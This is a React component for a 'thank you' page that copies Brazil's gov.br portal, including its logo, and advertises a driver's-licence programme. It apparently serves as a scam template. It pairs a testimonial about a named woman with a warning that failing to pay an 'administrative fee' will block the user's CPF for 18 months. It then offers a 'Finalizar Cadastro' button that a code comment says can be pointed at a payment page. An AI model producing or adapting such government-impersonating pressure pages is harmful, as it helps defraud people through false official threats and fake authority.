import React from 'react';
import { useLocation } from 'react-router-dom';
import { User, AlertTriangle } from 'lucide-react';

interface UserData {
    name: string;
}

const ThankYouHeader: React.FC<{ userName?: string }> = ({ userName }) => (
    <header className="bg-white border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4">
            <div className="py-3 flex items-center justify-between">
                <div className="flex items-center gap-4">
                    <img 
                        src="/Gov.br_logo.svg.png" 
                        alt="gov.br" 
                        className="h-8 md:h-10"
                    />
                </div>
                <div className="flex items-center gap-2">
                    <button className="flex items-center gap-2 bg-[#004381] text-white px-4 py-1.5 rounded-full text-sm font-medium hover:bg-blue-900 transition-colors">
                        <User size={18} />
                        <span>{userName || 'Entrar'}</span>
                    </button>
                </div>
            </div>
        </div>
    </header>
);

const ThankYouPage: React.FC = () => {
    const location = useLocation();
    const userData = location.state?.userData as UserData | undefined;
    const firstName = userData?.name.split(' ')[0];

    const handleFinalize = () => {
        // Esta ação pode ser alterada para redirecionar para uma página de pagamento.
        // Por enquanto, redireciona para uma página externa como exemplo.
        window.location.href = 'https://www.google.com';
    };

    return (
        <div className="bg-gray-50 min-h-screen">
            <ThankYouHeader userName={firstName} />
            <main className="max-w-2xl mx-auto px-4 py-12">
                <div className="bg-white p-8 rounded-lg shadow-md border border-gray-200">
                    <img 
                        src="/images.jpg" 
                        alt="Primeira brasileira a obter CNH com novas regras" 
                        className="w-full rounded-lg mb-6"
                    />

                    <p className="text-gray-700 leading-relaxed mb-6">
                        A paraibana <strong>Andreza Lima dos Santos</strong>, de 27 anos, tornou-se a primeira brasileira a obter a Carteira Nacional de Habilitação (CNH) pelo novo modelo do Programa CNH do Brasil.
                    </p>
                    <p className="text-gray-700 leading-relaxed mb-6">
                        Todo o processo foi concluído em apenas <strong>11 dias</strong>, desde o cadastro até o recebimento da CNH em sua residência.
                    </p>

                    <div className="bg-red-50 border-l-4 border-red-500 text-red-800 p-4 rounded-r-lg mb-6 flex items-start gap-3">
                        <AlertTriangle className="w-8 h-8 flex-shrink-0" />
                        <div>
                            <p><strong>ATENÇÃO:</strong> O não pagamento da taxa administrativa dentro do prazo estabelecido resultará no <strong>cancelamento automático do cadastro e bloqueio do CPF no sistema por um período de 18 (dezoito) meses</strong>, impossibilitando nova inscrição no programa.</p>
                        </div>
                    </div>

                    <div className="mb-6">
                        <h2 className="text-xl font-bold text-gray-800 mb-4">Após a confirmação do pagamento:</h2>
                        <ol className="list-decimal list-inside space-y-2 text-gray-700 pl-2">
                            <li>Liberação imediata do acesso ao aplicativo de aulas teóricas</li>
                            <li>Agendamento do exame prático em unidade do DETRAN próxima à sua residência</li>
                            <li>Recebimento da CNH definitiva em sua residência via Correios</li>
                        </ol>
                    </div>

                    <p className="text-gray-700 leading-relaxed mb-8">
                        Assim como Andreza e milhares de brasileiros que já foram beneficiados pelo programa, finalize seu cadastro agora e garanta sua vaga.
                    </p>

                    <button 
                        onClick={handleFinalize}
                        className="w-full bg-[#0d6efd] text-white py-4 rounded-lg font-bold text-lg hover:bg-blue-700 transition-colors animate-pulse"
                    >
                        Finalizar Cadastro
                    </button>
                </div>
            </main>
        </div>
    );
};

export default ThankYouPage;